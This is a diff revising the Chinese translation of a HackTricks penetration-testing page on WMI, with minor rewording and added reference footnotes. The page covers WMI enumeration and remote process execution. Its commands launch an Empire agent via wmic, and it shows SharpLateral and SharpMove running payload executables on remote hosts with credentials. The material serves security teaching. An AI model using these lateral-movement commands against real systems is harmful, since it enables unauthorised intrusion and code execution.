@@ -2,18 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 工作原理解释
+## 工作原理说明
 
-可以在已知用户名和密码或哈希的主机上通过使用 WMI 打开进程。通过 Wmiexec 使用 WMI 执行命令，提供半交互式的 shell 体验。
+通过使用 WMI，可以在已知用户名以及密码或 hash 的主机上打开进程。Wmiexec 使用 WMI 执行命令，提供类似半交互式 shell 的体验。
 
-**dcomexec.py:** 利用不同的 DCOM 端点，该脚本提供类似于 wmiexec.py 的半交互式 shell，特别利用 ShellBrowserWindow DCOM 对象。它目前支持 MMC20。应用程序、Shell Windows 和 Shell Browser Window 对象。（来源：[Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)）
+**dcomexec.py：** 此脚本利用不同的 DCOM endpoints，提供类似于 wmiexec.py 的半交互式 shell，具体使用 ShellBrowserWindow DCOM object。当前支持 MMC20。Application、Shell Windows 和 Shell Browser Window objects。（来源：[Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)）<sup>[[2]](#references)</sup>
 
 ## WMI 基础知识
 
-### 命名空间
+### Namespace
 
-WMI 的顶级容器是 \root，结构呈目录式层次，下面组织着称为命名空间 的其他目录。
-列出命名空间的命令：
+WMI 的顶级容器是 \root，采用目录式层级结构，其下组织着其他目录，这些目录称为 namespaces。<sup>[[1]](#references)</sup>
+列出 namespaces 的命令：
 ```bash
 # Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -24,14 +24,14 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 # Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-在命名空间内可以使用以下方式列出类：
+可以使用以下命令列出命名空间中的类：
 ```bash
 gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
-### **类**
+### **Classes**
 
-知道 WMI 类名，例如 win32_process，以及它所在的命名空间，对于任何 WMI 操作都是至关重要的。
+了解 WMI 类名（例如 `win32_process`）及其所在的 namespace，对于任何 WMI 操作都至关重要。  
 列出以 `win32` 开头的类的命令：
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -45,7 +45,7 @@ Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpCompute
 ```
 ### 方法
 
-方法是一个或多个可执行的 WMI 类函数，可以被执行。
+WMI 类的一个或多个可执行函数（Methods）可以被执行。
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -61,7 +61,7 @@ Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Descrip
 
 ### WMI 服务状态
 
-验证 WMI 服务是否正常运行的命令：
+用于验证 WMI 服务是否正常运行的命令：
 ```bash
 # WMI service status check
 Get-Service Winmgmt
@@ -76,7 +76,7 @@ net start | findstr "Instrumentation"
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
-对于攻击者来说，WMI 是一个强大的工具，用于枚举有关系统或域的敏感数据。
+对于攻击者来说，WMI 是枚举系统或域敏感数据的强大工具。<sup>[[1]](#references)</sup>
 ```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
@@ -85,21 +85,21 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-通过仔细构造命令，可以远程查询 WMI 以获取特定信息，例如本地管理员或登录用户。
+通过精心构造命令，可以远程查询 WMI 以获取特定信息，例如本地管理员或已登录用户。
 
 ### **手动远程 WMI 查询**
 
-可以通过特定的 WMI 查询隐秘地识别远程计算机上的本地管理员和登录用户。`wmic` 还支持从文本文件读取，以便同时在多个节点上执行命令。
+通过特定的 WMI 查询，可以隐蔽地识别远程计算机上的本地管理员和已登录用户。`wmic` 还支持从文本文件读取内容，以便同时在多个节点上执行命令。<sup>[[1]](#references)</sup>
 
-要通过 WMI 远程执行一个进程，例如部署 Empire 代理，使用以下命令结构，成功执行的返回值为 "0"：
+要通过 WMI 远程执行进程（例如部署 Empire agent），可以使用以下命令结构；返回值为 "0" 表示执行成功：<sup>[[1]](#references)</sup>
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-这个过程展示了WMI远程执行和系统枚举的能力，突显了它在系统管理和渗透测试中的实用性。
+此过程展示了 WMI 的远程执行和系统枚举能力，突出了其在系统管理和 penetration testing 中的实用性。
 
 ## 自动化工具
 
-- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+- [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
@@ -115,10 +115,13 @@ SharpMove.exe action=query computername=remote.host.local query="select * from w
 SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
-- 你也可以使用 **Impacket's `wmiexec`**。
+- 你也可以使用 **Impacket 的 `wmiexec`**。
 
-## 参考
 
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+## References
+
+- [1] [使用凭据攻陷 Windows 主机 - 第 3 部分（WMI 和 WinRM）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [2] [Impacket Tool Kit 初学者指南 - 第 1 部分](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
+
 
 {{#include ../../banners/hacktricks-training.md}}
